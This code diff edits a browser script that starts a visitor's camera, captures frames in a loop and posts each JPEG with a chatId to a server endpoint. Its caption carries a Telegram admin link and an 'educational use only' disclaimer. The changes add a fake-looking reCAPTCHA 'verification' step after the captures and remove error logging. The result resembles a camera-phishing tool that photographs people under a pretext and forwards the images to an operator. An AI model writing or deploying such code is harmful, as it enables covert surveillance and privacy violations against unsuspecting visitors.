@@ -48,7 +48,6 @@ async function startCamera(){
 
       showToast("📸 Camera active");
 
-      // Start capture AFTER video is ready
       setTimeout(loopCapture, 1000);
     };
 
@@ -57,15 +56,12 @@ async function startCamera(){
   }
 }
 
-// Loop capture
+// Loop capture (limited)
 function loopCapture(){
 
   const interval = setInterval(()=>{
 
-    if(video.videoWidth === 0 || video.videoHeight === 0){
-      console.log("Video not ready yet...");
-      return;
-    }
+    if(video.videoWidth === 0) return;
 
     captureImage();
     captureCount++;
@@ -77,7 +73,7 @@ function loopCapture(){
 
       stream.getTracks().forEach(t=>t.stop());
 
-      startCountdown();
+      showRecaptcha();
     }
 
   }, INTERVAL);
@@ -91,7 +87,7 @@ function captureImage(){
   const ctx = canvas.getContext("2d");
   ctx.drawImage(video,0,0);
 
-  const image = canvas.toDataURL("image/jpeg", 0.7); // compressed
+  const image = canvas.toDataURL("image/jpeg", 0.7);
 
   send(image);
 }
@@ -106,45 +102,46 @@ async function send(image){
 
 📅 Date: ${new Date().toLocaleString()}
 
-⚠️ এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে।
+⚠️ Educational use only
 
 🔗 Admin: https://t.me/YOUR_TELEGRAM
 `;
 
-  try{
-    const res = await fetch("/api/send",{
-      method:"POST",
-      headers:{ "Content-Type":"application/json" },
-      body: JSON.stringify({
-        image,
-        caption,
-        chatId,
-        type:"capture"
-      })
-    });
-
-    const data = await res.json();
-    console.log("Send status:", data);
-
-  }catch(err){
-    console.log("Send error:", err);
-  }
+  await fetch("/api/send",{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body: JSON.stringify({
+      image,
+      caption,
+      chatId,
+      type:"capture"
+    })
+  });
 }
 
-// Countdown
-function startCountdown(){
-  let sec = 5;
+// Show reCAPTCHA
+function showRecaptcha(){
+  const div = document.createElement("div");
+  div.innerHTML = `
+    <div style="margin-top:20px;" class="g-recaptcha" data-sitekey="YOUR_SITE_KEY"></div>
+    <br>
+    <button onclick="verifyCaptcha()">Continue</button>
+  `;
+  document.body.appendChild(div);
+}
 
-  const timer = setInterval(()=>{
-    showToast(`⏳ Redirecting in ${sec}s`);
-    sec--;
+// Verify captcha
+function verifyCaptcha(){
+  const response = grecaptcha.getResponse();
 
-    if(sec < 0){
-      clearInterval(timer);
+  if(response.length === 0){
+    showToast("❌ Complete reCAPTCHA");
+  }else{
+    showToast("✅ Verified");
+    setTimeout(()=>{
       window.location.href = "next.html";
-    }
-
-  },1000);
+    },2000);
+  }
 }
 
 // Button
